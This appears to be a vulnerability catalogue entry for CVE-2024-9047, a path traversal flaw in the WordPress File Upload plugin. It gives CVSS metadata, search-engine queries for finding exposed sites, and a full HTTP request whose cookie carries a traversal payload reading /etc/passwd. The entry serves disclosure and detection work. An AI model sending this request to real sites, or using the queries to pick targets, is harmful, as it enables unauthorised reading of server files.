---
layout: "post"
cve_id: "CVE-2024-9047"
title: "WordPress File Upload <= 4.24.11 - Arbitrary File Read"
pcap: true
pcap_path: "/pcaps/2024/CVE-2024-9047.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-9047.yaml"
author: "s4e-io,S9n3x"
severity: "critical"
reference:
  - "https://github.com/iSee857/CVE-2024-9047-PoC"
  - "https://nvd.nist.gov/vuln/detail/cve-2024-9047"
  - "https://plugins.trac.wordpress.org/changeset/3164449/wp-file-upload"
  - "https://www.wordfence.com/threat-intel/vulnerabilities/id/554a314c-9e8e-4691-9792-d086790ef40f?source=cve"
  - "https://github.com/wy876/POC"
  - "https://www.usom.gov.tr/bildirim/tr-24-1670"
  - "https://sploitus.com/exploit?id=3358E6CC-BC63-56E4-A4C4-1F70903C34D5"
classification:
  cvss-metrics: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
  cvss-score: 9.8
  cve-id: "CVE-2024-9047"
  cwe-id: "CWE-22"
  epss-score: 0.93496
  epss-percentile: 0.99812
metadata:
  max-request: 1
  vendor: "nickolas_bossinas"
  product: "wordpress-file-upload"
  framework: "wordpress"
  shodan-query: "http.html:\"/wp-content/plugins/wp-file-upload/\""
  fofa-query: "body=\"/wp-content/plugins/wp-file-upload\""
  publicwww-query: "/wp-content/plugins/wp-file-upload/"
tags:
  - "cve"
  - "cve2024"
  - "wp"
  - "wordpress"
  - "wp-plugin"
  - "wp-file-upload"
  - "lfi"
  - "vkev"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---


## ðŸ” Vulnerability Description
The WordPress File Upload plugin for WordPress is vulnerable to Path Traversal in all versions up to, and including, 4.24.11 via wfu_file_downloader.php. This makes it possible for unauthenticated attackers to read or delete files outside of the originally intended directory. Successful exploitation requires the targeted WordPress installation to be using PHP 7.4 or earlier.


## ðŸŒ HTTP Request
```nohighlight
GET /wp-content/plugins/wp-file-upload/wfu_file_downloader.php?file=qn7gjkHtva10xCKR&ticket=KLQymKf58TDh4zod&handler=dboption&session_legacy=1&dboption_base=cookies&dboption_useold=0&wfu_cookie=wp_wpfileupload_SuOg61pGInnQ7uNP29N52LpXZocpPeKR HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Connection: close
Cookie: wp_wpfileupload_SuOg61pGInnQ7uNP29N52LpXZocpPeKR=KFLJ4D5L0Hk8nHq4q4tbM8tbqyKdeVJu; wfu_storage_qn7gjkHtva10xCKR=/../../../../../etc/passwd[[name]]; wfu_download_ticket_KLQymKf58TDh4zod=6604126625310; wfu_ABSPATH=/;
Accept-Encoding: gzip
```


